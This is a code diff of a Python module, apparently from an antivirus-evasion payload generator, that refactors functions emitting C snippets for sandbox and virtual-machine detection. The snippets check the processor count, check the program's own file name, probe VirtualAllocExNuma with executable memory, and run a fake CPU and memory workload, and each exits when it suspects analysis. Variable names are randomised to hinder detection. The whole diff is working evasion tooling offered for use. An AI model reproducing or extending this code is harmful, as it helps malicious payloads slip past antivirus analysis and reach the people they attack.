@@ -3,77 +3,102 @@ import random
 
 
 # Add Anti-VM code
-def THE_GREAT_EVASION(FILENAME, ARCHITECTURE):
-    EVASION = ""
+def the_great_evasion(architecture, filename):
+    evasion_func = ""
+    evasion_funcname = ""
 
-    if ARCHITECTURE == "x86":
-        EVASION += NUMBER_OF_CORE()
-        EVASION += MY_NAME_IS(FILENAME)
-        EVASION += HARD_USAGE()
+    if architecture == "x86":
+        evasion_funcname_0, evasion_0 = hard_usage()
+        evasion_funcname_1, evasion_1 = number_of_core()
+        evasion_funcname_2, evasion_2 = my_name_is(filename)
+        evasion_func += evasion_0 + evasion_1 + evasion_2
+        evasion_funcname += evasion_funcname_0 + evasion_funcname_1 + evasion_funcname_2
 
     else:
-        EVASION += HARD_USAGE()
-        EVASION += MY_NAME_IS(FILENAME)
-        EVASION += NUMBER_OF_CORE()
-        EVASION += MONO_CORE()
+        evasion_funcname_0, evasion_0 = hard_usage()
+        evasion_funcname_1, evasion_1 = number_of_core()
+        evasion_funcname_2, evasion_2 = mono_core()
+        evasion_funcname_3, evasion_3 = my_name_is(filename)
+        evasion_func += evasion_0 + evasion_1 + evasion_2 + evasion_3
+        evasion_funcname += evasion_funcname_0 + evasion_funcname_1 + evasion_funcname_2 + evasion_funcname_3
 
-    core.EVASION_ADDED()
-
-    return EVASION
-
-
-def NUMBER_OF_CORE():
-    # Check number of core
-    SYSGUIDE = core.VARNAME_CREATOR()
-    CORE = core.VARNAME_CREATOR()
-    EVASION = "SYSTEM_INFO " + SYSGUIDE + ";\n"
-    EVASION += "GetSystemInfo(&" + SYSGUIDE + ");\n"
-    EVASION += "int " + CORE + " = " + SYSGUIDE + ".dwNumberOfProcessors;\n"
-    EVASION += "if (" + CORE + " < 2){exit(0);}\n\n"
-
-    return EVASION
+    core.evasion_added()
+    return evasion_funcname, evasion_func
 
 
-def MY_NAME_IS(FILENAME):
-    # Check if the begin name is the same
-    B = core.VARNAME_CREATOR()
-    FILENAME = FILENAME.replace('output/', '')
-    EVASION = 'if (strstr(argv[0], "' + FILENAME + '") > 0){int ' + B + ' = 0;}\n'
-    EVASION += "else{exit(0);}\n\n"
-
-    return EVASION
+def replace_string(evasion_funcname):
+    evasion_funcname = evasion_funcname.replace("void ", "").replace("void", "").replace("\n", "") + ";\n"
+    return evasion_funcname
 
 
-def MONO_CORE():
-    # AV have no multiproc
-    MEM2 = core.VARNAME_CREATOR()
-    EVASION = "LPVOID " + MEM2 + "= NULL;\n"
-    EVASION += MEM2 + " = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);\n"
-    EVASION += "if (" + MEM2 + " != NULL){\n"
-    EVASION += 'printf("Hello World");}\n'
-    EVASION += "else{exit(0);}\n\n"
+def my_name_is(filename):
+    evasion_funcname = "void " + core.varname_creator() + "(char *args)\n"
 
-    return EVASION
+    b = core.varname_creator()
+    filename = filename.replace('output/', '')
+    evasion_func = evasion_funcname
+    evasion_func += '{if (strstr(args, "' + filename + '") > 0){int ' + b + ' = 0;}\n'
+    evasion_func += "else{exit(0);}}\n\n"
+
+    evasion_funcname = evasion_funcname.replace("(char *args)", "(argv[0])")
+    evasion_funcname = replace_string(evasion_funcname)
+    return evasion_funcname, evasion_func
 
 
-def HARD_USAGE():
-    # Fake cpu/mem operation
-    OP1 = core.VARNAME_CREATOR()
-    OP1_VALUE = str(random.randint(6000, 8000))
-    ITERATOR1 = core.VARNAME_CREATOR()
-    MEM1 = core.VARNAME_CREATOR()
-    MEM1_VALUE = str(random.randint(45000000, 60000000))
-    EVASION = "int " + OP1 + "= " + OP1_VALUE + ";\n"
-    EVASION += "int " + ITERATOR1 + " = 0;\n"
-    EVASION += "for (" + ITERATOR1 + " = 0; " + ITERATOR1 + " < " + OP1 + "; " + ITERATOR1 + "++){\n"
-    EVASION += 'printf("%d\\n", ' + ITERATOR1 + ');\n'
-    EVASION += "char * " + MEM1 + " = NULL;\n"
-    EVASION += MEM1 + " = (char * )malloc(" + MEM1_VALUE + ");\n"
-    EVASION += "if (" + MEM1 + " != NULL){\n"
-    EVASION += "memset(" + MEM1 + ", 00, " + MEM1_VALUE + ");\n"
-    EVASION += "free(" + MEM1 + ");}\n"
-    EVASION += "else{exit(0);}}\n"
-    EVASION += "if (" + ITERATOR1 + " != " + OP1 + "){\n"
-    EVASION += "exit(0);}\n\n"
+# Check number of core
+def number_of_core():
+    evasion_funcname = "void " + core.varname_creator() + "(void)\n"
+    sysguide = core.varname_creator()
+    xcore = core.varname_creator()
 
-    return EVASION
+    evasion_func = evasion_funcname
+    evasion_func += "{SYSTEM_INFO " + sysguide + ";\n"
+    evasion_func += "GetSystemInfo(&" + sysguide + ");\n"
+    evasion_func += "int " + xcore + " = " + sysguide + ".dwNumberOfProcessors;\n"
+    evasion_func += "if (" + xcore + " < 2){exit(0);}}\n\n"
+
+    evasion_funcname = replace_string(evasion_funcname)
+    return evasion_funcname, evasion_func
+
+
+# AV have no multiproc
+def mono_core():
+    evasion_funcname = "void " + core.varname_creator() + "(void)\n"
+    mem2 = core.varname_creator()
+
+    evasion_func = evasion_funcname
+    evasion_func += "{LPVOID " + mem2 + "= NULL;\n"
+    evasion_func += mem2 + " = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);\n"
+    evasion_func += "if (" + mem2 + " != NULL){\n"
+    evasion_func += 'printf("' + core.varname_creator() + '");}\n'
+    evasion_func += "else{exit(0);}}\n\n"
+
+    evasion_funcname = replace_string(evasion_funcname)
+    return evasion_funcname, evasion_func
+
+
+# Fake cpu/mem operation
+def hard_usage():
+    evasion_funcname = "void " + core.varname_creator() + "(void)\n"
+    op1 = core.varname_creator()
+    op1_value = str(random.randint(6000, 8000))
+    iterator1 = core.varname_creator()
+    mem1 = core.varname_creator()
+    mem1_value = str(random.randint(45000000, 90000000))
+
+    evasion_func = evasion_funcname
+    evasion_func += "{int " + op1 + "= " + op1_value + ";\n"
+    evasion_func += "int " + iterator1 + " = 0;\n"
+    evasion_func += "for (" + iterator1 + " = 0; " + iterator1 + " < " + op1 + "; " + iterator1 + "++){\n"
+    evasion_func += 'printf("%d\\n", ' + iterator1 + ');\n'
+    evasion_func += "char * " + mem1 + " = NULL;\n"
+    evasion_func += mem1 + " = (char * )malloc(" + mem1_value + ");\n"
+    evasion_func += "if (" + mem1 + " != NULL){\n"
+    evasion_func += "memset(" + mem1 + ", 00, " + mem1_value + ");\n"
+    evasion_func += "free(" + mem1 + ");}\n"
+    evasion_func += "else{exit(0);}}\n"
+    evasion_func += "if (" + iterator1 + " != " + op1 + "){\n"
+    evasion_func += "exit(0);}}\n\n"
+
+    evasion_funcname = replace_string(evasion_funcname)
+    return evasion_funcname, evasion_func
